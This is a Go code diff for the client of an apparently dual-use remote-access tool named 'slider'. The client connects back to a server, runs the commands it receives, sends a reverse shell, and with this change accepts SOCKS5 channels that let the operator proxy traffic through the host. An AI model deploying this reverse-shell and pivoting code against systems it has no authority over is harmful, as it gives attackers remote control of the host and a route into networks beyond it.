@@ -13,6 +13,7 @@ import (
 	"slider/pkg/interpreter"
 	"slider/pkg/sconn"
 	"slider/pkg/slog"
+	"slider/pkg/ssocks"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -21,29 +22,28 @@ import (
 
 type client struct {
 	*slog.Logger
-	serverAddr     string
-	timeout        time.Duration
-	wsConfig       *websocket.Dialer
-	httpHeaders    http.Header
-	sshConfig      *ssh.ClientConfig
-	sshSession     *ssh.Session
-	sshClientConn  ssh.Conn
-	sshChannel     ssh.Channel
-	interpreter    *interpreter.Interpreter
-	ptyFile        *os.File
-	connReqChannel <-chan *ssh.Request
-	debug          bool
-	disconnect     chan bool
+	serverAddr    string
+	keepalive     time.Duration
+	wsConfig      *websocket.Dialer
+	httpHeaders   http.Header
+	sshConfig     *ssh.ClientConfig
+	sshClientConn ssh.Conn
+	interpreter   *interpreter.Interpreter
+	ptyFile       *os.File
+	debug         bool
+	disconnect    chan bool
+	socksInstance *ssocks.Instance
 }
 
 func NewClient(args []string) {
 	c := client{
-		Logger: slog.NewLogger("Client"),
+		Logger:     slog.NewLogger("Client"),
+		disconnect: make(chan bool, 1),
 	}
 
 	f := flag.NewFlagSet("client", flag.ContinueOnError)
 	f.BoolVar(&c.debug, "debug", false, "Verbose logging.")
-	f.DurationVar(&c.timeout, "timeout", 60*time.Second, "Set keepalive timeout in seconds.")
+	f.DurationVar(&c.keepalive, "keepalive", 60*time.Second, "Set keepalive interval in seconds.")
 	if parsErr := f.Parse(args); parsErr != nil || slices.Contains(f.Args(), "help") {
 		f.Usage()
 		return
@@ -105,8 +105,8 @@ func NewClient(args []string) {
 
 	c.disconnect = make(chan bool, 1)
 
-	if c.timeout > 0 {
-		go c.keepAlive(c.timeout)
+	if c.keepalive > 0 {
+		go c.keepAlive(c.keepalive)
 	}
 
 	go c.handleGlobalChannels(newChan)
@@ -118,14 +118,15 @@ func NewClient(args []string) {
 
 func (c *client) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
 	for nc := range newChan {
-		var err error
-
 		switch nc.ChannelType() {
+		case "socks5":
+			go c.handleSocksChannel(nc)
 		default:
 			c.Debugf("Rejected channel %s", nc.ChannelType())
-			if err = nc.Reject(ssh.UnknownChannelType, ""); err != nil {
-				c.Warnf("handleSSHnewChannels (session): Received Unknown channel type.\n%s",
-					err,
+			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
+				c.Warnf("Received Unknown channel type \"%s\" - %s",
+					nc.ChannelType(),
+					rErr,
 				)
 			}
 			return
@@ -146,7 +147,7 @@ func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
 		case "session-shell":
 			go c.sendReverseShell(req)
 		case "window-change":
-			// Server only sends this Request if Interpreter is PTY,
+			// Server only sends this Request if Interpreter is PTY
 			// after Reverse Shell is sent, ergo PTY File has been created
 			c.Debugf("Server Requested window change: %s\n", req.Payload)
 			var termSize interpreter.TermSize
@@ -154,12 +155,22 @@ func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
 				c.Fatalf("%s", err)
 			}
 			c.updatePtySize(termSize.Rows, termSize.Cols)
+		case "socks5-stop":
+			c.Debugf("Server Requested SOCKS shutdown")
+			_ = req.Reply(true, nil)
+			/*
+				if c.socksInstance.IsEnabled() {
+					if sErr := c.socksInstance.Stop(); sErr != nil {
+						c.Errorf("%s", sErr)
+					}
+				}
+			*/
 		case "disconnect":
 			c.Debugf("Server requested Client disconnection.")
 			_ = c.replyConnRequest(req, true, []byte("disconnected"))
 			c.disconnect <- true
 		default:
-			c.Debugf("Received unknown Connetion Request Type: \"%s\"", req.Type)
+			c.Debugf("Received unknown Connection Request Type: \"%s\"", req.Type)
 			_ = req.Reply(false, nil)
 		}
 	}
@@ -175,7 +186,7 @@ func (c *client) sendCommandExec(request *ssh.Request) {
 		c.Errorf("failed to open a \"session\" channel to server")
 		return
 	}
-	defer channel.Close()
+	defer func() { _ = channel.Close() }()
 
 	rcvCmd := string(request.Payload)
 	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", request.Payload, rcvCmd)
@@ -208,7 +219,6 @@ func (c *client) keepAlive(keepalive time.Duration) {
 			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
 				c.Errorf("[KeepAlive] Lost connection to Server.")
 				c.disconnect <- true
-				return
 			}
 		}
 	}
@@ -231,4 +241,29 @@ func (c *client) sendSessionRequest(sshSession *ssh.Session, requestType string,
 	}
 	c.Debugf("Sent Session Request \"%s\", received: \"%v\" from server.\n", requestType, okR)
 	return nil
+}
+
+func (c *client) handleSocksChannel(newChan ssh.NewChannel) {
+	socksChan, req, aErr := newChan.Accept()
+	if aErr != nil {
+		c.Errorf(
+			"Failed to accept \"%s\" channel.\n%s",
+			newChan.ChannelType(),
+			aErr,
+		)
+		return
+	}
+	defer func() { _ = socksChan.Close() }()
+	go ssh.DiscardRequests(req)
+
+	config := &ssocks.InstanceConfig{
+		Logger:       c.Logger,
+		IsServer:     true,
+		SocksChannel: socksChan,
+	}
+	c.socksInstance = ssocks.New(config)
+
+	if err := c.socksInstance.StartServer(); err != nil {
+		c.Debugf("SOCKS - %s", err)
+	}
 }
